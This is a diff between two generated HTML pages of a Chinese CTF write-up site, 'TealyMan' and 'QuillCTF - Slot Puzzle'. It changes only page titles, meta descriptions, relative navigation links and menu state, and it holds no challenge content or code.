@@ -6,28 +6,28 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="2023 | WolvCTF | Crypto">
+        <meta name="description" content="2023 | Hard | Solidity Security">
       
       
         <meta name="author" content="YanhuiJessica">
       
       
-        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/tealyman/">
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/wargames/quillctf/slot_puzzle/">
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-8.3.3">
     
     
       
-        <title>Blockchain - TealyMan - Chictf-Writeups</title>
+        <title>QuillCTF - Slot Puzzle - Chictf-Writeups</title>
       
     
     
   
-      <link rel="stylesheet" href="../../assets/stylesheets/main.4a0965b7.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.4a0965b7.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
         
           
           
@@ -56,7 +56,7 @@
       
     
     
-    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#_1" class="md-skip">
+        <a href="#objective-of-ctf" class="md-skip">
           跳转至
         </a>
       
@@ -94,7 +94,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="页眉">
-    <a href="../.." title="Chictf-Writeups" class="md-header__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
+    <a href="../../.." title="Chictf-Writeups" class="md-header__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Blockchain - TealyMan
+              QuillCTF - Slot Puzzle
             
           </span>
         </div>
@@ -197,7 +197,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../.." class="md-tabs__link">
+      <a href="../../.." class="md-tabs__link">
         简介
       </a>
     </li>
@@ -213,7 +213,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../misc/unpleasant_music/" class="md-tabs__link">
+      <a href="../../../misc/unpleasant_music/" class="md-tabs__link">
         Misc
       </a>
     </li>
@@ -229,7 +229,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../web/t_star_upload_bypass/" class="md-tabs__link">
+      <a href="../../../web/t_star_upload_bypass/" class="md-tabs__link">
         Web
       </a>
     </li>
@@ -245,7 +245,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../reverse/easyre/" class="md-tabs__link">
+      <a href="../../../reverse/easyre/" class="md-tabs__link">
         Reverse
       </a>
     </li>
@@ -261,7 +261,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../pwn/when_did_you_born/" class="md-tabs__link">
+      <a href="../../../pwn/when_did_you_born/" class="md-tabs__link">
         Pwn
       </a>
     </li>
@@ -277,7 +277,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../crypto/bank/" class="md-tabs__link">
+      <a href="../../../crypto/bank/" class="md-tabs__link">
         Crypto
       </a>
     </li>
@@ -287,15 +287,13 @@
         
   
   
-    
-  
 
 
   
   
   
     <li class="md-tabs__item">
-      <a href="../code_is_law/" class="md-tabs__link md-tabs__link--active">
+      <a href="../../../blockchain/code_is_law/" class="md-tabs__link">
         Blockchain
       </a>
     </li>
@@ -305,6 +303,8 @@
         
   
   
+    
+  
 
 
   
@@ -316,7 +316,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../wargames/natas/" class="md-tabs__link">
+      <a href="../../natas/" class="md-tabs__link md-tabs__link--active">
         Wargames
       </a>
     </li>
@@ -334,7 +334,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../eggs/ctfhub_index/" class="md-tabs__link">
+      <a href="../../../eggs/ctfhub_index/" class="md-tabs__link">
         彩蛋
       </a>
     </li>
@@ -362,7 +362,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="Chictf-Writeups" class="md-nav__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
+    <a href="../../.." title="Chictf-Writeups" class="md-nav__button md-logo" aria-label="Chictf-Writeups" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82Z"/></svg>
@@ -419,7 +419,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         首页
       </a>
     </li>
@@ -433,7 +433,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../how_to_participate/" class="md-nav__link">
+      <a href="../../../how_to_participate/" class="md-nav__link">
         如何参与
       </a>
     </li>
@@ -481,7 +481,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/unpleasant_music/" class="md-nav__link">
+      <a href="../../../misc/unpleasant_music/" class="md-nav__link">
         Unpleasant music
       </a>
     </li>
@@ -495,7 +495,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/leaf_cover_eyes/" class="md-nav__link">
+      <a href="../../../misc/leaf_cover_eyes/" class="md-nav__link">
         一叶障目
       </a>
     </li>
@@ -509,7 +509,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/difficult_programming_language/" class="md-nav__link">
+      <a href="../../../misc/difficult_programming_language/" class="md-nav__link">
         Difficult Programming Language
       </a>
     </li>
@@ -523,7 +523,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/secret_information/" class="md-nav__link">
+      <a href="../../../misc/secret_information/" class="md-nav__link">
         机密信息
       </a>
     </li>
@@ -537,7 +537,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/hide_and_seek/" class="md-nav__link">
+      <a href="../../../misc/hide_and_seek/" class="md-nav__link">
         藏藏藏
       </a>
     </li>
@@ -551,7 +551,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/targz_y1ng/" class="md-nav__link">
+      <a href="../../../misc/targz_y1ng/" class="md-nav__link">
         TARGZ-y1ng
       </a>
     </li>
@@ -565,7 +565,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/gakki/" class="md-nav__link">
+      <a href="../../../misc/gakki/" class="md-nav__link">
         gakki
       </a>
     </li>
@@ -605,7 +605,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/account_bot/" class="md-nav__link">
+      <a href="../../../misc/account_bot/" class="md-nav__link">
         从零开始的记账工具人
       </a>
     </li>
@@ -619,7 +619,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/gibberish_message/" class="md-nav__link">
+      <a href="../../../misc/gibberish_message/" class="md-nav__link">
         从零开始的火星文生活
       </a>
     </li>
@@ -633,7 +633,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/self_repeating_repeater/" class="md-nav__link">
+      <a href="../../../misc/self_repeating_repeater/" class="md-nav__link">
         自复读的复读机
       </a>
     </li>
@@ -647,7 +647,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/233_string_tool/" class="md-nav__link">
+      <a href="../../../misc/233_string_tool/" class="md-nav__link">
         233 同学的字符串工具
       </a>
     </li>
@@ -661,7 +661,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/233_docker/" class="md-nav__link">
+      <a href="../../../misc/233_docker/" class="md-nav__link">
         233 同学的 Docker
       </a>
     </li>
@@ -675,7 +675,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/4f_system_middle/" class="md-nav__link">
+      <a href="../../../misc/4f_system_middle/" class="md-nav__link">
         来自一教的图片
       </a>
     </li>
@@ -689,7 +689,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/basic_math_simulator/" class="md-nav__link">
+      <a href="../../../misc/basic_math_simulator/" class="md-nav__link">
         超基础的数理模拟器
       </a>
     </li>
@@ -710,7 +710,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/stegano50/" class="md-nav__link">
+      <a href="../../../misc/stegano50/" class="md-nav__link">
         Stegano50
       </a>
     </li>
@@ -724,7 +724,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/newsctf_all_reverse/" class="md-nav__link">
+      <a href="../../../misc/newsctf_all_reverse/" class="md-nav__link">
         NEWSCTF - ！了反都，了反
       </a>
     </li>
@@ -738,7 +738,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/audio_frequency_stego/" class="md-nav__link">
+      <a href="../../../misc/audio_frequency_stego/" class="md-nav__link">
         audio-frequency-stego
       </a>
     </li>
@@ -778,7 +778,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/pirates/" class="md-nav__link">
+      <a href="../../../misc/pirates/" class="md-nav__link">
         Pirates
       </a>
     </li>
@@ -792,7 +792,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/teg_rads/" class="md-nav__link">
+      <a href="../../../misc/teg_rads/" class="md-nav__link">
         Teg Rads
       </a>
     </li>
@@ -813,7 +813,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/hearing_not_believing/" class="md-nav__link">
+      <a href="../../../misc/hearing_not_believing/" class="md-nav__link">
         HearingNotBelieving
       </a>
     </li>
@@ -853,7 +853,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/transparent_file/" class="md-nav__link">
+      <a href="../../../misc/transparent_file/" class="md-nav__link">
         透明的文件
       </a>
     </li>
@@ -867,7 +867,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/encrypted_u_disk/" class="md-nav__link">
+      <a href="../../../misc/encrypted_u_disk/" class="md-nav__link">
         加密的 U 盘
       </a>
     </li>
@@ -881,7 +881,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/p_q/" class="md-nav__link">
+      <a href="../../../misc/p_q/" class="md-nav__link">
         p😭q
       </a>
     </li>
@@ -928,7 +928,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/yusa_little_secret/" class="md-nav__link">
+      <a href="../../../misc/yusa_little_secret/" class="md-nav__link">
         YUSA的小秘密
       </a>
     </li>
@@ -942,7 +942,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/yusa_secret/" class="md-nav__link">
+      <a href="../../../misc/yusa_secret/" class="md-nav__link">
         Yusa的秘密
       </a>
     </li>
@@ -963,7 +963,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/compress_the_flag/" class="md-nav__link">
+      <a href="../../../misc/compress_the_flag/" class="md-nav__link">
         Compress The Flag
       </a>
     </li>
@@ -977,7 +977,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/s_script_gi/" class="md-nav__link">
+      <a href="../../../misc/s_script_gi/" class="md-nav__link">
         s/&lt;script&gt;//gi
       </a>
     </li>
@@ -991,7 +991,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/log4_sanity_check/" class="md-nav__link">
+      <a href="../../../misc/log4_sanity_check/" class="md-nav__link">
         Log 4 sanity check
       </a>
     </li>
@@ -1005,7 +1005,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/bishop_duel/" class="md-nav__link">
+      <a href="../../../misc/bishop_duel/" class="md-nav__link">
         Bishop Duel
       </a>
     </li>
@@ -1019,7 +1019,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/lighthouse/" class="md-nav__link">
+      <a href="../../../misc/lighthouse/" class="md-nav__link">
         Lighthouse
       </a>
     </li>
@@ -1033,7 +1033,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../misc/last_digit/" class="md-nav__link">
+      <a href="../../../misc/last_digit/" class="md-nav__link">
         last digit
       </a>
     </li>
@@ -1081,7 +1081,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/t_star_upload_bypass/" class="md-nav__link">
+      <a href="../../../web/t_star_upload_bypass/" class="md-nav__link">
         文件上传 JS 绕过
       </a>
     </li>
@@ -1095,7 +1095,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/t_star_tomcat/" class="md-nav__link">
+      <a href="../../../web/t_star_tomcat/" class="md-nav__link">
         小猫咪踩灯泡
       </a>
     </li>
@@ -1109,7 +1109,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/ctfhub_reflected_xss/" class="md-nav__link">
+      <a href="../../../web/ctfhub_reflected_xss/" class="md-nav__link">
         CTFHub - 反射型 XSS
       </a>
     </li>
@@ -1123,7 +1123,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/initiative/" class="md-nav__link">
+      <a href="../../../web/initiative/" class="md-nav__link">
         主动
       </a>
     </li>
@@ -1137,7 +1137,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/funhash/" class="md-nav__link">
+      <a href="../../../web/funhash/" class="md-nav__link">
         Funhash
       </a>
     </li>
@@ -1151,7 +1151,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/xss_game/" class="md-nav__link">
+      <a href="../../../web/xss_game/" class="md-nav__link">
         XSS Game
       </a>
     </li>
@@ -1165,7 +1165,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/web_php_include/" class="md-nav__link">
+      <a href="../../../web/web_php_include/" class="md-nav__link">
         Web php include
       </a>
     </li>
@@ -1179,7 +1179,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/ctfhub_git_leakage/" class="md-nav__link">
+      <a href="../../../web/ctfhub_git_leakage/" class="md-nav__link">
         CTFHub - Git 泄露
       </a>
     </li>
@@ -1193,7 +1193,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/newsctf_easy_web/" class="md-nav__link">
+      <a href="../../../web/newsctf_easy_web/" class="md-nav__link">
         NEWSCTF - easy_web
       </a>
     </li>
@@ -1207,7 +1207,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/heres_a_flag/" class="md-nav__link">
+      <a href="../../../web/heres_a_flag/" class="md-nav__link">
         Here's a Flag
       </a>
     </li>
@@ -1247,7 +1247,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/sale_melon/" class="md-nav__link">
+      <a href="../../../web/sale_melon/" class="md-nav__link">
         卖瓜
       </a>
     </li>
@@ -1261,7 +1261,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/flag_red_packet/" class="md-nav__link">
+      <a href="../../../web/flag_red_packet/" class="md-nav__link">
         FLAG 助力大红包
       </a>
     </li>
@@ -1275,7 +1275,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/info_above_graph/" class="md-nav__link">
+      <a href="../../../web/info_above_graph/" class="md-nav__link">
         图之上的信息
       </a>
     </li>
@@ -1296,7 +1296,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/most_secure_crypto_algo/" class="md-nav__link">
+      <a href="../../../web/most_secure_crypto_algo/" class="md-nav__link">
         Most Secure Crypto Algo
       </a>
     </li>
@@ -1310,7 +1310,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../web/calculus_calc_exercise/" class="md-nav__link">
+      <a href="../../../web/calculus_calc_exercise/" class="md-nav__link">
         微积分计算小练习
       </a>
     </li>
@@ -1358,7 +1358,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../reverse/easyre/" class="md-nav__link">
+      <a href="../../../reverse/easyre/" class="md-nav__link">
         EasyRe
       </a>
     </li>
@@ -1372,7 +1372,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../reverse/z3/" class="md-nav__link">
+      <a href="../../../reverse/z3/" class="md-nav__link">
         z3
       </a>
     </li>
@@ -1386,7 +1386,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../reverse/newsctf_re_signin/" class="md-nav__link">
+      <a href="../../../reverse/newsctf_re_signin/" class="md-nav__link">
         NEWSCTF - re_signin
       </a>
     </li>
@@ -1434,7 +1434,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../pwn/when_did_you_born/" class="md-nav__link">
+      <a href="../../../pwn/when_did_you_born/" class="md-nav__link">
         when did you born
       </a>
     </li>
@@ -1448,7 +1448,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../pwn/amnesia/" class="md-nav__link">
+      <a href="../../../pwn/amnesia/" class="md-nav__link">
         Amnesia
       </a>
     </li>
@@ -1496,7 +1496,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/bank/" class="md-nav__link">
+      <a href="../../../crypto/bank/" class="md-nav__link">
         bank
       </a>
     </li>
@@ -1510,7 +1510,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/shanghai/" class="md-nav__link">
+      <a href="../../../crypto/shanghai/" class="md-nav__link">
         shanghai
       </a>
     </li>
@@ -1524,7 +1524,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/easy_rsa/" class="md-nav__link">
+      <a href="../../../crypto/easy_rsa/" class="md-nav__link">
         easy_RSA
       </a>
     </li>
@@ -1538,7 +1538,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/normal_rsa/" class="md-nav__link">
+      <a href="../../../crypto/normal_rsa/" class="md-nav__link">
         Normal_RSA
       </a>
     </li>
@@ -1552,7 +1552,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/easy_ecc/" class="md-nav__link">
+      <a href="../../../crypto/easy_ecc/" class="md-nav__link">
         easy_ECC
       </a>
     </li>
@@ -1566,7 +1566,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/fanfie/" class="md-nav__link">
+      <a href="../../../crypto/fanfie/" class="md-nav__link">
         fanfie
       </a>
     </li>
@@ -1580,7 +1580,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/jefferson_disk/" class="md-nav__link">
+      <a href="../../../crypto/jefferson_disk/" class="md-nav__link">
         转轮机加密
       </a>
     </li>
@@ -1594,7 +1594,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/code_modulate/" class="md-nav__link">
+      <a href="../../../crypto/code_modulate/" class="md-nav__link">
         编码与调制
       </a>
     </li>
@@ -1608,7 +1608,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/ciscn_rsa/" class="md-nav__link">
+      <a href="../../../crypto/ciscn_rsa/" class="md-nav__link">
         CISCN - rsa
       </a>
     </li>
@@ -1622,7 +1622,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/opisthocomus_hoazin/" class="md-nav__link">
+      <a href="../../../crypto/opisthocomus_hoazin/" class="md-nav__link">
         opisthocomus-hoazin
       </a>
     </li>
@@ -1636,7 +1636,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/stars_and_shapes/" class="md-nav__link">
+      <a href="../../../crypto/stars_and_shapes/" class="md-nav__link">
         Stars and Shapes
       </a>
     </li>
@@ -1650,7 +1650,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/he_thrusts_his_fists_against_the_post/" class="md-nav__link">
+      <a href="../../../crypto/he_thrusts_his_fists_against_the_post/" class="md-nav__link">
         He Thrusts His Fists Against the Post
       </a>
     </li>
@@ -1690,7 +1690,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/alkaloid_stream/" class="md-nav__link">
+      <a href="../../../crypto/alkaloid_stream/" class="md-nav__link">
         Alkaloid Stream
       </a>
     </li>
@@ -1704,7 +1704,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/steroid_stream/" class="md-nav__link">
+      <a href="../../../crypto/steroid_stream/" class="md-nav__link">
         Steroid Stream
       </a>
     </li>
@@ -1725,7 +1725,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/easyxor/" class="md-nav__link">
+      <a href="../../../crypto/easyxor/" class="md-nav__link">
         easyxor
       </a>
     </li>
@@ -1739,7 +1739,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/ustc_easy_rsa/" class="md-nav__link">
+      <a href="../../../crypto/ustc_easy_rsa/" class="md-nav__link">
         HackerGame - Easy RSA
       </a>
     </li>
@@ -1753,7 +1753,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/baby_mac/" class="md-nav__link">
+      <a href="../../../crypto/baby_mac/" class="md-nav__link">
         Baby MAC
       </a>
     </li>
@@ -1767,7 +1767,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/noteasy03/" class="md-nav__link">
+      <a href="../../../crypto/noteasy03/" class="md-nav__link">
         noteasy03
       </a>
     </li>
@@ -1781,7 +1781,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/dealymaffs/" class="md-nav__link">
+      <a href="../../../crypto/dealymaffs/" class="md-nav__link">
         Dealymaffs
       </a>
     </li>
@@ -1795,7 +1795,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/weird_programmer/" class="md-nav__link">
+      <a href="../../../crypto/weird_programmer/" class="md-nav__link">
         Weird Programmer
       </a>
     </li>
@@ -1809,7 +1809,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/x_factor/" class="md-nav__link">
+      <a href="../../../crypto/x_factor/" class="md-nav__link">
         X Factor
       </a>
     </li>
@@ -1823,7 +1823,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/paiaiai/" class="md-nav__link">
+      <a href="../../../crypto/paiaiai/" class="md-nav__link">
         P(ai)^3
       </a>
     </li>
@@ -1837,7 +1837,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/casino/" class="md-nav__link">
+      <a href="../../../crypto/casino/" class="md-nav__link">
         Casino
       </a>
     </li>
@@ -1851,7 +1851,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/black_hole/" class="md-nav__link">
+      <a href="../../../crypto/black_hole/" class="md-nav__link">
         Black Hole
       </a>
     </li>
@@ -1865,7 +1865,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/diophantine/" class="md-nav__link">
+      <a href="../../../crypto/diophantine/" class="md-nav__link">
         Diophantine
       </a>
     </li>
@@ -1905,7 +1905,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/cycling/" class="md-nav__link">
+      <a href="../../../crypto/cycling/" class="md-nav__link">
         Cycling
       </a>
     </li>
@@ -1919,7 +1919,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/maybe_someday/" class="md-nav__link">
+      <a href="../../../crypto/maybe_someday/" class="md-nav__link">
         Maybe Someday
       </a>
     </li>
@@ -1940,7 +1940,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/dynamic_rsa/" class="md-nav__link">
+      <a href="../../../crypto/dynamic_rsa/" class="md-nav__link">
         Dynamic RSA
       </a>
     </li>
@@ -1980,7 +1980,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/exchanged/" class="md-nav__link">
+      <a href="../../../crypto/exchanged/" class="md-nav__link">
         exchanged
       </a>
     </li>
@@ -1994,7 +1994,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/leapfrog/" class="md-nav__link">
+      <a href="../../../crypto/leapfrog/" class="md-nav__link">
         leapfrog
       </a>
     </li>
@@ -2015,7 +2015,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../crypto/shuffle128/" class="md-nav__link">
+      <a href="../../../crypto/shuffle128/" class="md-nav__link">
         shuffle128
       </a>
     </li>
@@ -2035,14 +2035,12 @@
 
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
       
       
       
@@ -2065,7 +2063,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../code_is_law/" class="md-nav__link">
+      <a href="../../../blockchain/code_is_law/" class="md-nav__link">
         Code is Law
       </a>
     </li>
@@ -2079,7 +2077,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../totally_secure_dapp/" class="md-nav__link">
+      <a href="../../../blockchain/totally_secure_dapp/" class="md-nav__link">
         Totally Secure Dapp
       </a>
     </li>
@@ -2093,7 +2091,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cairo_reverse/" class="md-nav__link">
+      <a href="../../../blockchain/cairo_reverse/" class="md-nav__link">
         Cairo Reverse
       </a>
     </li>
@@ -2107,7 +2105,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tctf_nft_market/" class="md-nav__link">
+      <a href="../../../blockchain/tctf_nft_market/" class="md-nav__link">
         TCTF NFT Market
       </a>
     </li>
@@ -2147,7 +2145,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../secret_and_ephemeral/" class="md-nav__link">
+      <a href="../../../blockchain/secret_and_ephemeral/" class="md-nav__link">
         Secret and Ephemeral
       </a>
     </li>
@@ -2161,7 +2159,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../private_log/" class="md-nav__link">
+      <a href="../../../blockchain/private_log/" class="md-nav__link">
         Private Log
       </a>
     </li>
@@ -2182,7 +2180,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../memory_master_on_the_chain/" class="md-nav__link">
+      <a href="../../../blockchain/memory_master_on_the_chain/" class="md-nav__link">
         链上记忆大师
       </a>
     </li>
@@ -2196,7 +2194,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cookie_market/" class="md-nav__link">
+      <a href="../../../blockchain/cookie_market/" class="md-nav__link">
         Cookie Market
       </a>
     </li>
@@ -2210,7 +2208,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tetctftoken/" class="md-nav__link">
+      <a href="../../../blockchain/tetctftoken/" class="md-nav__link">
         TetCTFToken
       </a>
     </li>
@@ -2224,7 +2222,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../realwrap/" class="md-nav__link">
+      <a href="../../../blockchain/realwrap/" class="md-nav__link">
         realwrap
       </a>
     </li>
@@ -2238,7 +2236,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../evmvm/" class="md-nav__link">
+      <a href="../../../blockchain/evmvm/" class="md-nav__link">
         evmvm
       </a>
     </li>
@@ -2278,7 +2276,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../dragon_slayer/" class="md-nav__link">
+      <a href="../../../blockchain/dragon_slayer/" class="md-nav__link">
         Dragon Slayer
       </a>
     </li>
@@ -2292,7 +2290,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../diamond_heist/" class="md-nav__link">
+      <a href="../../../blockchain/diamond_heist/" class="md-nav__link">
         Diamond Heist
       </a>
     </li>
@@ -2311,82 +2309,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          TealyMan
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../../blockchain/tealyman/" class="md-nav__link">
         TealyMan
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    题目
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    解题思路
-  </a>
-  
-    <nav class="md-nav" aria-label="解题思路">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#flag" class="md-nav__link">
-    Flag
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    参考资料
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -2404,12 +2331,14 @@
 
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" checked>
       
       
       
@@ -2458,7 +2387,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../wargames/natas/" class="md-nav__link">
+      <a href="../../natas/" class="md-nav__link">
         Natas
       </a>
     </li>
@@ -2472,7 +2401,7 @@
   
   
     <li class="md-nav__item">
